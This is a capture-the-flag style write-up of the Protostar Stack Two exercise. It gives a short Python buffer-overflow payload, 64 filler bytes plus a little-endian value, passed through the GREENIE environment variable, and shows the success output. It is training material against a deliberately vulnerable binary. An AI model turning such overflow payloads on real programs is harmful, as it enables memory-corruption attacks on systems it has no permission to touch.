<!DOCTYPE html>
<html>
  <head>
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <title>pwncone.io</title>
    <link rel="stylesheet" href="../../../../css/style.css">
  </head>

<body>
<section>

    <writeup>
        <h1><strong>#Protostar - Stack Two</strong></h1>
        <a href="https://exploit.education/protostar/stack-two/">https://exploit.education/protostar/stack-two/</a><br>
        <br>
        <img alt="images\17-1.png" src="images/17-1.png"><br>
        <br>
        This level is the same as Stack Two, except that we have to provide our payload in an environment vairable and change the <code>modified</code> variable to <code>0x0d0a0d0a</code>.<br>
        <br>
        To set the GREENIE environment variable on the machine, we can either:<br>
        • <code>GREENIE=&lt;payload&gt;</code><br>
        • or <code>os.environ</code> within python - <code>os.environ['GREENIE'] = payload</code><br>
        <br>
        <a id="h2-1" name="h2-1"></a><strong></strong>
        <h2><strong>1) Write exploit</strong></h2><br>
        First, we write 64 bytes of junk to fill the <code>buffer</code> variable.<br>
        After that, we write <code>0x0d0a0d0a</code> in little endian format to the stack to overwrite the <code>modified</code> variable.<br>
        <br>
            <div class="codebox">
                <span style="color:#0088ff;font-weight:400">#!/usr/bin/python</span><br>
                <span style="color:#0088ff;font-weight:400">#&nbsp;exploit.education&nbsp;-&nbsp;Stack&nbsp;Two</span><br>
                <br>
                <span style="color:#333333;font-weight:400">import</span>&nbsp;os<br>
                <span style="color:#333333;font-weight:400">import</span>&nbsp;struct<br>
                <br>
                payload&nbsp;&nbsp;=&nbsp;<span style="color:#3ad900;font-weight:400">"A"</span>*<span style="color:#ff0044;font-weight:400">64</span><br>
                payload&nbsp;+=&nbsp;struct.pack(<span style="color:#3ad900;font-weight:400">'&lt;I'</span>,&nbsp;<span style="color:#ff0044;font-weight:400">0x0d0a0d0a</span>)<br>
                <br>
                <span style="color:#ff9d00;font-weight:700">print</span>&nbsp;payload
            </div>
        </div><br>
        <br>
        <a id="h2-2" name="h2-2"></a><strong></strong>
        <h2><strong>2) Win</strong></h2><br>
        Set the <code>GREENIE</code> environment variable on the system and run stack2.<br>
        Those backticks - <code>`</code> - execute the code within them (executing our exploit code and printing out our payload)..<br>
        <br>
            <div class="codebox">
                $&nbsp;GREENIE=<span style="color:#333333;font-weight:400">`python&nbsp;/tmp/stack2.py`</span><br>
                $&nbsp;.<span style="color:#ff9d00;font-weight:700">/</span>stack2<br>
                you&nbsp;have&nbsp;correctly&nbsp;modified&nbsp;the&nbsp;variable
            </div>
        </div>
    </writeup>
</section>

</body>
</html>